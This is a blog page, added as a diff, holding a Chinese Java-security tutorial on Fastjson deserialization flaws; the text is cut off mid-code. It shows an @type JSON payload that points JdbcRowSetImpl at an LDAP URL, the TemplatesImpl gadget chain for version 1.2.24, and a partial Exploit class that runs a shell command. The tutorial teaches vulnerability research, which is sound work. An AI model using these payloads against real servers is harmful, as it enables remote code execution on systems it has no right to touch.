@@ -1,0 +1,2086 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>java安全8-Fastjson反序列化漏洞 - Happ3n</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<link rel="shortcut icon" href="/images/head/head.jpg" type="image/jpg" />
+<meta name="description" content="java安全8-Fastjson反序列化漏洞Fastjson是阿里巴巴的一个开源java库，提供两个主要接口，JSON.toJSONString和JSON.parseObject&#x2F;JSON. parse来分别实现序列化（将java对象转换为JSON字符串）和反序列化操作（将JSON字符串转换为java对象） JSON.toJSONString序列化：  JSON.parseObject反">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全8-Fastjson反序列化漏洞">
+<meta property="og:url" content="https://itwillhappen.github.io/2025/09/25/java-%E5%AE%89%E5%85%A8-8-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Happ3n">
+<meta property="og:description" content="java安全8-Fastjson反序列化漏洞Fastjson是阿里巴巴的一个开源java库，提供两个主要接口，JSON.toJSONString和JSON.parseObject&#x2F;JSON. parse来分别实现序列化（将java对象转换为JSON字符串）和反序列化操作（将JSON字符串转换为java对象） JSON.toJSONString序列化：  JSON.parseObject反">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412184727-1qb8d3z.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412185006-s0pka37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412185706-3m0wgw2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260411201921-kbw8p9h.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412174806-ppnt50c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141629-cyfk6h6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141329-rnqlun6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141437-1gkre8u.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141540-vkt6v1b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414143014-7ecg5mf.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260417161908-b1cqby5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260417170332-a2tsr3e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260417170631-lkq4trh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260420145606-ahzmq00.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260420145624-xy3n3kn.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421125621-3vzqjg9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421132450-tb5ih2z.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421134437-0x204s0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421140522-g6boljt.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421142700-ib1s7lq.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421150944-bcs859j.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421160734-irf2vh5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421161052-231yisj.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421161307-hnp4qgx.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421161443-ah7makq.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421164406-29ullmo.png">
+<meta property="article:published_time" content="2025-09-25T17:42:47.000Z">
+<meta property="article:modified_time" content="2025-09-25T17:19:49.000Z">
+<meta property="article:author" content="Happ3n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412184727-1qb8d3z.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1776763871749">
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_2421060_8z08qcz5sq3.css">
+
+<link rel="stylesheet" href="/css/style.css?v=1776763871749">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1776763871749">
+    
+        <link rel="stylesheet" href="/themes/umaru/index.css?v=1776763871749">
+    
+        <link rel="stylesheet" href="/themes/asuka/index.css?v=1776763871749">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1776763871749"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1Z7TFL96ZH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-1Z7TFL96ZH');
+</script>
+<script src="https://unpkg.com/hexo-shiki-plugin@1.0.27/lib/codeblock.js"></script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.svipaigc.com/bizi/2024/01/013249-170127916952c1.jpg)"></div><div class="nexmoe-character"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon nexmoe-avatar" href="/" title="Happ3n"><img src="/images/head/head.jpg" alt="Happ3n"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Happ3n">
+            <img src="/images/head/head.jpg" alt="Happ3n" alt="Happ3n">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div class="nexmoe-count-item"><span>文章</span>16 <div class="item-radius"></div><div class="item-radius item-right"></div> </div>
+        <div class="nexmoe-count-item"><span>标签</span>0<div class="item-radius"></div><div class="item-radius item-right"></div></div>
+        <div class="nexmoe-count-item"><span>分类</span>0<div class="item-radius"></div><div class="item-radius item-right"></div></div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-meishi"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-hanbao1"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于糖糖">
+            <i class="mdui-list-item-icon nexmoefont icon-jiubei1"></i>
+            <div class="mdui-list-item-content">
+                关于糖糖
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/friend.html" title="大伙伴们">
+            <i class="mdui-list-item-icon nexmoefont icon-cola"></i>
+            <div class="mdui-list-item-content">
+                大伙伴们
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/memos.html" title="小朋友圈">
+            <i class="mdui-list-item-icon nexmoefont icon-tangguo"></i>
+            <div class="mdui-list-item-content">
+                小朋友圈
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap" style="background: transparent;box-shadow: none;">
+    <div class="nexmoe-widget nexmoe-switch-theme">
+        <div class="theme-toggle-container" onclick="useToggle()">
+            <!-- 背景元素 -->
+            <div class="toggle-background">
+                <!-- 白云 -->
+                <div class="clouds">
+                    <div class="cloud cloud1"></div>
+                    <div class="cloud cloud2"></div>
+                    <div class="cloud cloud3"></div>
+                </div>
+                <!-- 星空 -->
+                <div class="stars">
+                    <div class="star star1"></div>
+                    <div class="star star2"></div>
+                    <div class="star star3"></div>
+                    <div class="star star4"></div>
+                    <div class="star star5"></div>
+                </div>
+            </div>
+            <!-- 太阳/月亮滑块 -->
+            <div class="theme-slider">
+                <svg class="theme-icon sun" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="5" fill="#ffd700"/>
+                    <path d="M12 1V3M12 21V23M4.22 4.22L5.64 5.64M18.36 18.36L19.78 19.78M1 12H3M21 12H23M4.22 19.78L5.64 18.36M18.36 5.64L19.78 4.22" stroke="#ffd700" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                <svg class="theme-icon moon" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+</div>
+<style>
+    /* 主题切换过渡动画 */
+    ::view-transition-group(root) {
+        animation-duration: 0.7s;
+        animation-timing-function: var(--expo-out);
+    }
+
+    ::view-transition-new(root) {
+        animation-name: reveal-light;
+        animation-fill-mode: both;
+    }
+
+    ::view-transition-old(root),
+    [data-theme="dark"]::view-transition-old(root) {
+        animation: none;
+        animation-fill-mode: both;
+        z-index: -1;
+    }
+
+    [data-theme="dark"]::view-transition-new(root) {
+        animation-name: reveal-dark;
+        animation-fill-mode: both;
+    }
+
+    @keyframes reveal-dark {
+        from {
+            clip-path: polygon(50% -71%, -50% 71%, -50% 71%, 50% -71%);
+        }
+
+        to {
+            clip-path: polygon(50% -71%, -50% 71%, 50% 171%, 171% 50%);
+        }
+    }
+
+    @keyframes reveal-light {
+        from {
+            clip-path: polygon(171% 50%, 50% 171%, 50% 171%, 171% 50%);
+        }
+
+        to {
+            clip-path: polygon(171% 50%, 50% 171%, -50% 71%, 50% -71%);
+        }
+    }
+
+    /* 主题切换矩形样式 */
+    .nexmoe-switch-theme {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .theme-toggle-container {
+        position: relative;
+        width: inherit;
+        height: 70px;
+        background: linear-gradient(135deg, #87CEEB 0%, #E0F7FA 100%);
+        border-radius: 35px;
+        cursor: pointer;
+        overflow: hidden;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        transform: scale(0.8);
+    }
+
+    /* 深色主题下的背景 */
+    [data-theme="dark"] .theme-toggle-container {
+        background: linear-gradient(135deg, #0a0e27 0%, #1a1a2e 100%);
+    }
+
+    /* 背景元素容器 */
+    .toggle-background {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        overflow: hidden;
+    }
+
+    /* 白云样式 */
+    .clouds {
+        position: absolute;
+        left: 70%;
+        top: 50%;
+        transform: translateY(-50%);
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    [data-theme="dark"] .clouds {
+        opacity: 0;
+        right: -50px;
+    }
+
+    .cloud {
+        position: absolute;
+        background: white;
+        border-radius: 50px;
+        opacity: 0.8;
+        animation: cloudFloat 4s ease-in-out infinite;
+    }
+
+    .cloud1 {
+        width: 30px;
+        height: 20px;
+        top: 0;
+        left: 0;
+    }
+
+    .cloud2 {
+        width: 25px;
+        height: 15px;
+        top: 25px;
+        left: 10px;
+        animation-delay: 1s;
+    }
+
+    .cloud3 {
+        width: 20px;
+        height: 15px;
+        top: 10px;
+        left: 35px;
+        animation-delay: 2s;
+    }
+
+    /* 云朵浮动动画 */
+    @keyframes cloudFloat {
+        0%, 100% {
+            transform: translateY(0) rotate(0deg);
+        }
+        50% {
+            transform: translateY(-5px) rotate(2deg);
+        }
+    }
+
+    /* 星空样式 */
+    .stars {
+        position: absolute;
+        left: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        opacity: 0;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    [data-theme="dark"] .stars {
+        opacity: 1;
+    }
+
+    .star {
+        position: absolute;
+        background: white;
+        border-radius: 50%;
+        animation: starTwinkle 2s ease-in-out infinite;
+    }
+
+    .star1 {
+        width: 3px;
+        height: 3px;
+        top: 0;
+        left: 0;
+    }
+
+    .star2 {
+        width: 2px;
+        height: 2px;
+        top: 20px;
+        left: 25px;
+        animation-delay: 0.5s;
+    }
+
+    .star3 {
+        width: 4px;
+        height: 4px;
+        top: 10px;
+        left: 50px;
+        animation-delay: 1s;
+    }
+
+    .star4 {
+        width: 2px;
+        height: 2px;
+        top: 30px;
+        left: 35px;
+        animation-delay: 1.5s;
+    }
+
+    .star5 {
+        width: 3px;
+        height: 3px;
+        top: 15px;
+        left: 15px;
+        animation-delay: 2s;
+    }
+
+    /* 星星闪烁动画 */
+    @keyframes starTwinkle {
+        0%, 100% {
+            opacity: 0.3;
+            transform: scale(1);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+            filter: drop-shadow(0 0 3px white);
+        }
+    }
+
+    /* 太阳/月亮滑块 */
+    .theme-slider {
+        position: absolute;
+        left: 5px;
+        top: 5px;
+        width: 60px;
+        height: 60px;
+        background: white;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        z-index: 1;
+    }
+
+    [data-theme="dark"] .theme-slider {
+        left: calc(100% - 60px - 5px);
+        background: #f0f0f0;
+    }
+
+    /* 太阳和月亮图标 */
+    .theme-icon {
+        position: absolute;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .sun {
+        opacity: 1;
+        transform: scale(1) rotate(0deg);
+    }
+
+    .moon {
+        opacity: 0;
+        transform: scale(0.8) rotate(-90deg);
+    }
+
+    [data-theme="dark"] .sun {
+        opacity: 0;
+        transform: scale(0.8) rotate(90deg);
+    }
+
+    [data-theme="dark"] .moon {
+        opacity: 1;
+        transform: scale(1) rotate(0deg);
+    }
+
+    /* 太阳和月亮的发光效果 */
+    @keyframes sunPulse {
+        0%, 100% {
+            filter: drop-shadow(0 0 6px #ffd700);
+        }
+        50% {
+            filter: drop-shadow(0 0 12px #ffd700) drop-shadow(0 0 18px rgba(255, 215, 0, 0.7));
+        }
+    }
+
+    @keyframes moonGlow {
+        0%, 100% {
+            filter: drop-shadow(0 0 4px #e0e7ff);
+        }
+        50% {
+            filter: drop-shadow(0 0 8px #e0e7ff) drop-shadow(0 0 12px rgba(224, 231, 255, 0.7));
+        }
+    }
+
+    /* 应用发光动画 */
+    .sun {
+        animation: sunPulse 3s ease-in-out infinite;
+    }
+
+    .moon {
+        animation: moonGlow 3s ease-in-out infinite;
+    }
+
+    /* 鼠标悬停效果 */
+    .theme-toggle-container:hover {
+        transform: scale(0.9);
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    /* 点击效果 */
+    .theme-toggle-container:active {
+        transform: scale(0.98);
+    }
+</style>
+<script>
+    const localTheme = typeof localStorage !== "undefined" && localStorage.getItem("hexo-theme")
+    let theme = localTheme || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light")
+    document.documentElement.setAttribute("data-theme", theme)
+
+    function switchTheme() {
+        theme = theme === "dark" ? "light" : "dark"
+        document.documentElement.setAttribute("data-theme", theme)
+        localStorage.setItem("hexo-theme", theme)
+    }
+
+    function useToggle() {
+        const isAppearanceTransition = document.startViewTransition && !window.matchMedia("(prefers-reduced-motion: reduce)").matches
+        if (!isAppearanceTransition) switchTheme()
+        document.startViewTransition(switchTheme)
+    }
+</script>
+    
+        
+        <div style="position: relative;">
+    <div class="nexmoe-widget-wrap">
+        <div class="nexmoe-widget nexmoe-search">
+            
+                    <form id="search_form">
+                        <label><input oninput="sinput()" class="st-default-search-input search-input"
+                                style="color:var(--color-text-2);" id="search_value" name="q" type="search"
+                                placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+                    </form>
+                    
+        </div>
+    </div>
+
+    <div class="search-body">
+
+    </div>
+</div>
+<style>
+    .search-body {
+        position: absolute;
+        width: calc(100% - 40px);
+        margin: 0 20px;
+        box-sizing: border-box;
+        top: 60px;
+        right: 0;
+        background-color: var(--color-card);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        z-index: 1000;
+        max-height: 300px;
+        overflow-y: auto;
+        overflow-x: hidden;
+        color: var(--color-text-1);
+        border-radius: 12px;
+    }
+    .search-body a {
+        color: var(--color-text-1);
+    }
+    .search-body .keyword {
+        font-weight: bold;
+        color: var(--color-primary);
+    }
+    .search-result {
+       padding: 10px 20px;
+       border-bottom: 1px dashed var(--color-primary);
+       cursor: pointer;
+    }
+
+    .search-result-title {
+        font-size: 16px;
+        font-weight: bold;
+        white-space: nowrap;
+        /* 防止文本换行 */
+        overflow: hidden;
+        /* 隐藏溢出的内容 */
+        text-overflow: ellipsis;
+        /* 显示省略号来代表被修剪的文本 */
+    }
+
+    .search-result-text {
+        font-size: 14px;
+        white-space: nowrap;
+        /* 防止文本换行 */
+        overflow: hidden;
+        /* 隐藏溢出的内容 */
+        text-overflow: ellipsis;
+        /* 显示省略号来代表被修剪的文本 */
+    }
+    
+</style>
+
+
+    <script async src="/js/search.js?v=1776763871750"></script>
+        
+
+            
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="http://wpa.qq.com/msgrd?v=3&uin=2120252100&site=qq&menu=yes"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ'}"
+			style="
+				color: rgb(64, 196, 255);
+				background-color: rgba(64, 196, 255, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="mailto:tangyuxian@vip.qq.com"
+			target="_blank"
+			mdui-tooltip="{content: 'mail'}"
+			style="
+				color: rgb(249,8,8);
+				background-color: rgba(249,8,8,.1);
+			"
+		>
+			<i
+				class="nexmoefont icon-mail-fill"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/qq_40621378?type=blog"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(199,29,35);
+				background-color: rgba(199,29,35,.1);
+			"
+		>
+			<i
+				class="nexmoefont icon-csdn"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.cnblogs.com/lovetangyuxian/"
+			target="_blank"
+			mdui-tooltip="{content: '博客园'}"
+			style="
+				color: rgb(66, 214, 29);
+				background-color: rgba(66, 214, 29, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bokeyuan"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/tangyuxian/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .15);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://gitee.com/tangyuxian"
+			target="_blank"
+			mdui-tooltip="{content: 'gitee'}"
+			style="
+				color: rgb(255, 255, 255);
+				background-color: rgb(199,29,35);
+			"
+		>
+			<i
+				class="nexmoefont icon-mayun"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/09/25/java-%E5%AE%89%E5%85%A8-8-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">java安全8-Fastjson反序列化漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/13/java-%E5%AE%89%E5%85%A8-7-Spring-%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6-ApacheShiro/">java安全7-Spring框架之安全框架Apache Shiro</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/31/java-%E5%AE%89%E5%85%A8-6-Spring-%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6-SpringSecurity/">java安全6-Spring框架之安全框架Spring Security</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/19/java-%E5%AE%89%E5%85%A8-5-Spring-%E6%A1%86%E6%9E%B6%E4%B9%8B-SpEL-%E6%B3%A8%E5%85%A5/">java安全5-Spring框架之SpEL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/08/java-%E5%AE%89%E5%85%A8-4-JNDI-%E4%B8%8E-XSS/">java安全4-JNDI与XSS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://memos.tangyuxian.com/" target="_blank" >
+                    <img src="https://cdn.tangyuxian.com/PicGoImages/202304272004917.jpg" alt="糖糖的闺中小秘密"></img>
+                    <p style="color: var(--color-primary)">糖糖的闺中小秘密</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2026 Happ3n
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/tangyuxian/hexo-theme-tangyuxian" target="_blank">Tangyuxian</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">辽ICP备2021002341号</a>
+<div style="font-size: 12px">
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+   本站总访问量  <a id="busuanzi_value_site_pv"></a> 次<br />
+   本站访客数<a id="busuanzi_value_site_uv"></a>人次
+</div>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover">
+            <img src="https://cdn.svipaigc.com/bizi/2024/01/013249-170127916952c1.jpg" alt="java安全8-Fastjson反序列化漏洞" loading="lazy">
+            <h1>java安全8-Fastjson反序列化漏洞</h1>
+        </div>
+        
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年09月25日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="java安全8-Fastjson反序列化漏洞"><a href="#java安全8-Fastjson反序列化漏洞" class="headerlink" title="java安全8-Fastjson反序列化漏洞"></a>java安全8-Fastjson反序列化漏洞</h1><p>Fastjson是阿里巴巴的一个开源java库，提供两个主要接口，JSON.toJSONString和JSON.parseObject&#x2F;JSON. parse来分别实现序列化（将java对象转换为JSON字符串）和反序列化操作（将JSON字符串转换为java对象）</p>
+<p>JSON.toJSONString序列化：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412184727-1qb8d3z.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>JSON.parseObject反序列化：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412185006-s0pka37.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>在反序列化时，有java.lang.reflect.Type类，通过@type指定一个类的全限定名，Fastjson会尝试创建这个类的实例，并在反序列化时调用其中的方法，实现远程调用方法</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412185706-3m0wgw2.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/Test&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化时创建JdbcRowSetImpl类，根据dataSourceName所给的url，去指定的ldap服务中调取方法，实现远程调用</p>
+<h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><h3 id="利用一：templates反序列链"><a href="#利用一：templates反序列链" class="headerlink" title="利用一：templates反序列链"></a>利用一：templates反序列链</h3><p>链子与java安全3中CB链TemplatesImpl动态加载恶意类一致</p>
+<p><a href="https://itwillhappen.github.io/2025/07/25/java-%E5%AE%89%E5%85%A8-3-CB-%E9%93%BE%E4%B8%8E-CC-%E9%93%BE/">https://itwillhappen.github.io/2025/07/25/java-%E5%AE%89%E5%85%A8-3-CB-%E9%93%BE%E4%B8%8E-CC-%E9%93%BE/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties-&gt;newTransformer-&gt;getTransletInstance-&gt;defineTransletClasses-&gt;TransletClassLoader</span><br></pre></td></tr></table></figure>
+
+<p>进行测试，创建Exploit类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class Exploit extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.err.println(&quot;&gt;&gt;&gt; Pwned &lt;&lt;&lt;&quot;);</span><br><span class="line"></span><br><span class="line">            String[] cmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;touch /tmp/pwned&quot;&#125;;</span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Exploit() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException 